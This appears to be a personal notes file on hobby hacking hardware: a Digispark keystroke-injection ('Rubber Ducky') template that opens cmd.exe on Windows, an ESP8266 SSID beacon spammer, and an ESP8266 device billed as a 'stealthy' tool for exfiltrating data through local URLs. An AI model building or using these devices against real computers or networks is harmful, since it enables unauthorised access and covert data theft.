# Rubber Ducky
- Requires Arduino
- https://javiervidrua.github.io/blog/jekyll/update/2020/11/06/rubber-ducky-with-digispark-attiny85.html
- DigiKeyboard
- Purpose: 
	- Automatcially execute keybaord actions on Windows computers
- Template
```
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT); 
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cmd.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}

void loop() {
}
```
# Wifi Beacon
- Requires Arduino
- Generic ESP8266
- Purpose: 
	- Spam multiple SSIDs onto the network. 
	- SSIDs cannot be connected
- POC:
![[POC_WIFI_Beacon.jpg]]
# WIFI Exfil
- Requires Arduino
- Generic ESP8266, ESPAsyncTCP, ESPAystncWebServer
- Purpose
	- Stores any string/hash/word data via WIFI connection
	- Stealthy
- Cons:
	- Does not work with IOS devices
	- only laptop devies so far
	- No internet connection
- Usage
```
192.168.4.1/login?password=DATA
192.168.4.1/storage1
To access other storages read the code <3
```
- POC
![[POC1_WIFI_EXFILL.png]]
![[POC2_WIFII_EXFILL.png]]